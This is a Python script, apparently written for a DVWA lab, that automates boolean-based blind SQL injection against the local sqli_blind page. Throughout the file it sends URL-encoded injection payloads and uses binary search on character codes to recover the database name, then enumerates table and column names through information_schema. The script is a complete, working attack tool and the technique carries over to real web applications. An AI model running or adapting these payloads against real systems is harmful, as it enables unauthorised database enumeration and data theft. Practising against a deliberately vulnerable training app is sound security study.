from pwn import *
import requests, re, logging
from itertools import cycle

url = 'http://127.0.0.1/DVWA/vulnerabilities/sqli_blind'
fixed_query = '?Submit=Submit&id=1'
cookies={'PHPSESSID':'pqbeifo5bt92nb3q9mcpvl4ma2', 'security':'low'}
# context.log_level ='debug'
context.log_level ='info'

def sql_injection(sqli_ptl, variable, sqli_pt2):
    next_url = url + fixed_query + sqli_ptl + variable + sqli_pt2
    debug('Testing ' + variable + ' on \"' + next_url + '\"')
    return requests.get(next_url, cookies=cookies)

def guess_len(guess_type, sqli_ptl, sqli_pt2):
    for i in range(1, 100):
        response = sql_injection(sqli_ptl, str(i), sqli_pt2)
        error_message = re.search(r'User.*\.', response.text).group(0)
        debug(error_message)
        if "MISSING" not in error_message:
            success(guess_type + str(i) + '\n\n')
            return i


def guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_char_initial):
    name = ""
    for i in range(1, name_len+1):
        found_next_char=0
        min_char = min_char_initial
        max_char = max_char_initial
        current_char = int((min_char + max_char)/2)
        comparison_types = cycle(['<', '>'])
        comparison = next(comparison_types)
        while(found_next_char != 2):
            response = sql_injection(sqli_pt1 + str(i) + "," + str(i) + "))" + comparison, str(current_char), sqli_pt2)
            error_message = re.search(r'User.*\.', response.text).group(0)
            debug(error_message)

            if "MISSING" not in error_message:
                found_next_char = 0
                if comparison == '>':
                    min_char = current_char
                else:
                    max_char = current_char
                current_char = int((min_char + max_char)/2)
            else:
                comparison = next(comparison_types)
                found_next_char += 1
        name += chr(current_char)
        info("Found char(" + str(i) + "): " + chr(current_char))
    success(guess_type + name + '\n\n')
    return name

db_name_len = guess_len("DB Name Length : ", "'+and+length(database())+=", "+%23")
db_name = guess_name("DB Name: ", "'+and+ascii(substr(database(),", "+%23", db_name_len, ord('a'), ord('z'))
db_table_count = guess_len("DB Table Count : ", "'+and+(select+count(*)+from+information_schema.tables+where+table_schema=database())+=", "+%23")
for table_no in range(db_table_count):
    table_name_len = guess_len("Table Name Length: ", "'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),1))+=", "+%23")
    table_name = guess_name("Table Name: ", "'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),", "+%23", table_name_len, ord('a'), ord('z'))
    table_field_count = guess_len("Table Field Count: ", "'+and+(select+count(column_name)+from+information_schema.columns+where+table_name='" + table_name + "')+=", "+%23")
    for field_no in range(table_field_count):
        field_name_len = guess_len("Field Name Length: ", "'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+1+offset+" + str(field_no) + "),1))+=", "+%23")
        field_name = guess_name("Field Name: ", "'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+1+offset+" + str(field_no) + "),", "+%23", field_name_len, ord(' '), ord('z'))